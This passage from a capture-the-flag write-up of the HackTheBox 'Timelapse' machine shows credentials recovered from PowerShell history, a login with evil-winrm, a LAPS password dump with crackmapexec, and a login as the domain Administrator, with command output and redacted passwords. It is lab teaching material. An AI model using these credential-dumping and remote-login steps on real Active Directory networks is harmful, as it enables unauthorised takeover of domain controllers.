$p = ConvertTo-SecureString '{Redacted}' -AsPlainText -Force
$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
invoke-command -computername localhost -credential $c -port 5986 -usessl -
SessionOption $so -scriptblock {whoami}
get-aduser -filter * -properties *
exit
```

Nice! We found `svc_deploy`'s password!

**Let's WinRM as `svc_deploy`!**
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Timelapse)-[2023.08.09|18:07:48(HKT)]
└> evil-winrm -S -i $RHOSTS -u svc_deploy -p '{Redacted}'
[...]                  
*Evil-WinRM* PS C:\Users\svc_deploy\Documents> whoami; ipconfig /all
timelapse\svc_deploy

Windows IP Configuration

   Host Name . . . . . . . . . . . . : dc01
   Primary Dns Suffix  . . . . . . . : timelapse.htb
   Node Type . . . . . . . . . . . . : Hybrid
   IP Routing Enabled. . . . . . . . : No
   WINS Proxy Enabled. . . . . . . . : No
   DNS Suffix Search List. . . . . . : timelapse.htb

Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . :
   Description . . . . . . . . . . . : vmxnet3 Ethernet Adapter
   Physical Address. . . . . . . . . : 00-50-56-B9-7B-4A
   DHCP Enabled. . . . . . . . . . . : No
   Autoconfiguration Enabled . . . . : Yes
   Link-local IPv6 Address . . . . . : fe80::4113:1f9:543d:6321%13(Preferred)
   IPv4 Address. . . . . . . . . . . : 10.10.11.152(Preferred)
   Subnet Mask . . . . . . . . . . . : 255.255.254.0
   Default Gateway . . . . . . . . . : 10.10.10.2
   DHCPv6 IAID . . . . . . . . . . . : 33574998
   DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-2C-65-68-F0-00-50-56-B9-7B-4A
   DNS Servers . . . . . . . . . . . : 127.0.0.1
[...]
```

I'm user `svc_deploy`!

### svc_deploy to Administrator

**Since we're `svc_deploy`, and `svc_deploy` is a member of `LAPS_Readers` group, we can access the LAPS password!**

**However, instead using `LAPSToolkit.ps1`, we can also use `crackmapexec` to dump LAPS passwords!**
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Timelapse)-[2023.08.09|18:13:17(HKT)]
└> crackmapexec ldap $RHOSTS -u svc_deploy -p '{Redacted}' --kdcHost $RHOSTS -M laps
SMB         10.10.11.152    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:timelapse.htb) (signing:True) (SMBv1:False)
LDAP        10.10.11.152    389    DC01             [+] timelapse.htb\svc_deploy:{Redacted} 
LAPS        10.10.11.152    389    DC01             [*] Getting LAPS Passwords
LAPS        10.10.11.152    389    DC01             Computer: DC01$                Password: {Redacted}
```

Nice! We found a LAPS password!

Now, we can WinRM into the Domain Controller's local `Administrator`, who is also a Domain Admins!

**Login as `Administrator` via `evil-winrm`:**
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Timelapse)-[2023.08.09|18:14:49(HKT)]
└> evil-winrm -S -i $RHOSTS -u Administrator -p '{Redacted}'
[...]
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami; ipconfig /all
timelapse\administrator

Windows IP Configuration

   Host Name . . . . . . . . . . . . : dc01
   Primary Dns Suffix  . . . . . . . : timelapse.htb
   Node Type . . . . . . . . . . . . : Hybrid
   IP Routing Enabled. . . . . . . . : No
   WINS Proxy Enabled. . . . . . . . : No
   DNS Suffix Search List. . . . . . : timelapse.htb

Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . :
   Description . . . . . . . . . . . : vmxnet3 Ethernet Adapter
   Physical Address. . . . . . . . . : 00-50-56-B9-7B-4A
   DHCP Enabled. . . . . . . . . . . : No
   Autoconfiguration Enabled . . . . : Yes
   Link-local IPv6 Address . . . . . : fe80::4113:1f9:543d:6321%13(Preferred)
   IPv4 Address. . . . . . . . . . . : 10.10.11.152(Preferred)
   Subnet Mask . . . . . . . . . . . : 255.255.254.0
   Default Gateway . . . . . . . . . : 10.10.10.2
   DHCPv6 IAID . . . . . . . . . . . : 33574998
   DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-2C-65-68-F0-00-50-56-B9-7B-4A
   DNS Servers . . . . . . . . . . . : 127.0.0.1
[...]
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                       Type             SID                                         Attributes
================================================ ================ =========================================== ===============================================================
Everyone                                         Well-known group S-1-1-0                                     Mandatory group, Enabled by default, Enabled group
BUILTIN\Administrators                           Alias            S-1-5-32-544                                Mandatory group, Enabled by default, Enabled group, Group owner
BUILTIN\Users                                    Alias            S-1-5-32-545                                Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access       Alias            S-1-5-32-554                                Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                             Well-known group S-1-5-2                                     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users                 Well-known group S-1-5-11                                    Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization                   Well-known group S-1-5-15                                    Mandatory group, Enabled by default, Enabled group
TIMELAPSE\Group Policy Creator Owners            Group            S-1-5-21-671920749-559770252-3318990721-520 Mandatory group, Enabled by default, Enabled group
TIMELAPSE\Domain Admins                          Group            S-1-5-21-671920749-559770252-3318990721-512 Mandatory group, Enabled by default, Enabled group
TIMELAPSE\Enterprise Admins                      Group            S-1-5-21-671920749-559770252-3318990721-519 Mandatory group, Enabled by default, Enabled group
TIMELAPSE\Schema Admins                          Group            S-1-5-21-671920749-559770252-3318990721-518 Mandatory group, Enabled by default, Enabled group
TIMELAPSE\Denied RODC Password Replication Group Alias            S-1-5-21-671920749-559770252-3318990721-572 Mandatory group, Enabled by default, Enabled group, Local Group
NT AUTHORITY\NTLM Authentication                 Well-known group S-1-5-64-10                                 Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level             Label            S-1-16-12288
```

I'm `Administrator` (Domain Admins)! :D

## Rooted

**root.txt:**
```shell
*Evil-WinRM* PS C:\Users\TRX\Desktop> type root.txt
{Redacted}
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Timelapse/images/Pasted%20image%2020230809181742.png)

## Conclusion

What we've learned:

1. Enumerating SMB shares
2. Cracking password protected zip file and `pfx` certificate
3. Horizontal privilege escalation via clear-text credentials in PowerShell history
4. Vertical privilege escalation via dumping LAPS password